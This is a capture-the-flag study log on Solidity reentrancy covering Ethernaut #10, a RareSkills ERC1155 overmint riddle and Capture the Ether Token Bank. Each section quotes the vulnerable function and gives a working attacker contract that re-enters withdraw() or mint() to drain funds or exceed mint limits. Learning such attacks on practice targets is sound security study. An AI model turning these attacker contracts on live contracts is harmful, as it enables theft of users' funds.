
## Day 5 Re-entrancy

### Ethernaut #10 Re-entrancy

The goal of this level is to take all the funds.  A few things to note:

- The contract uses Solidity 0.6.12, so it may be vunerable to over/underflow
- The ```withdraw()``` function sends funds to the msg.sender, perhaps calling an external contract.  
- The ```withdraw()``` function calls the external contract before updating state.  

```withdraw()``` is shown below:

```Java
  function withdraw(uint _amount) public {
    if(balances[msg.sender] >= _amount) {
      (bool result,) = msg.sender.call{value:_amount}("");
      if(result) {
        _amount;
      }
      balances[msg.sender] -= _amount;
    }
  }
```

A contract was written to do a reentrancy attack.  The attack starts with a normal call to ```withdraw()``` however in the attacking contract's receive() there is another withdraw() called.  This actually caused the attacker's balance to underflow as well which is surprising becasue OZ SafeMath was used.  


```Java
contract ReentranceAttacker {
  Reentrance target;

  constructor(address payable _targetAdd) public payable{
    require(msg.value == 1 ether);
    target = Reentrance(_targetAdd);
    target.donate{value: 1 ether}(address(this));
  }

  function doubleWithdraw() external {
    target.withdraw(1 ether);
  }

  receive() external payable {
    target.withdraw(1 ether);
  }
}
```

### RareSkills Riddles: ERC1155

This is a Hardhat test where the ojctive is to write an attacking contract that has a balance of 5.  
The victim contract is an ERC1155 which is a token.  The victim contract has a mint() method which will call the ERC1155 _mint() before updating the state, this seems like the best place for an attack. 

```Java
    function mint(uint256 id, bytes calldata data) external {
        require(amountMinted[msg.sender][id] <= 3, "max 3 NFTs");
        totalSupply[id]++;
        _mint(msg.sender, id, 1, data);
        amountMinted[msg.sender][id]++;
    }
```

The attack should call mint() then have a function which gets called by _mint() and that should call mint() again, we just need to keep track of how many times we call mint and make sure it is exactly five.  The function in our contract where we can call mint() again is the ERC1155Recevier.  We need to implement two functions ```onERC1155Received()``` and ```onERC1155BatchReceived().```  In ```onERC1155Received()``` we can call ```mint()``` four more times to get a total of five tokens.  A solution is given in the code below.  


```Java
// SPDX-License-Identifier: GPL-3.0
pragma solidity 0.8.15;

import "./Overmint1-ERC1155.sol";
import "hardhat/console.sol";
import "@openzeppelin/contracts/token/ERC1155/utils/ERC1155Receiver.sol";

contract Overmint1_ERC1155_Attacker is ERC1155Receiver {

    Overmint1_ERC1155 immutable victim;
    uint256 constant ID = 0;
    uint256 numMinted = 0;

    constructor(address _victimAdd){
        victim = Overmint1_ERC1155(_victimAdd);
    }

    function attack() external {
        numMinted = 1;
        victim.mint(ID, "");

        // transfer tokens from contract to the Boss
        victim.safeTransferFrom(address(this), msg.sender, ID, 5, "");
    }

    function onERC1155Received(address,address,uint256,uint256, bytes calldata)
    external override returns(bytes4) {
        // call mint()  again 
        if (numMinted < 5) {
            numMinted++;
            victim.mint(ID, "");
        }
        return this.onERC1155Received.selector;
    }

    function onERC1155BatchReceived(address, address, uint256[] calldata, uint256[] calldata, bytes calldata)
    external pure override returns(bytes4) {
        return this.onERC1155BatchReceived.selector;
    }
}
```

### Capture the Ether Token Bank 

There is a bank and a simple token contract.  The bank has deposits, and if someone issues a withdraw then they will issue tokens to the user.  The bank starts off with half of its deposits given to the player and half given to the deployer.  The objective is to drain the bank.  

```Java
    function withdraw(uint256 amount) public {
        require(balanceOf[msg.sender] >= amount);

        require(token.transfer(msg.sender, amount));
        balanceOf[msg.sender] -= amount;
    }
```

The most obvious vector of attack here is reentrancy during withdraw() becasue the state is updated last.  Similar to the prior exercise a fallback function can be called only if the origin is a contract. We need to create an attacker contract that will do a reentrancy attack.  The following contract worked.  

```Java
/**
The attacker is created first, then its address is given to the bank.  After the 
bank is deployed 
*/
contract Attacker {
    address public bankAdd;
    bool public fallBackCalled;

    function setBankAdd(address _bankAdd) external {
        bankAdd = _bankAdd;
    }

    function attack() external {
        fallBackCalled = false;
        TokenBankChallenge bank = TokenBankChallenge(bankAdd);
        bank.withdraw(500000000000000000000000);
    }

    function tokenFallback(address, uint256, bytes) public {
        if (!fallBackCalled) {
            fallBackCalled = true;
            TokenBankChallenge bank = TokenBankChallenge(bankAdd);
            bank.withdraw(500000000000000000000000);
        }
    }
}
```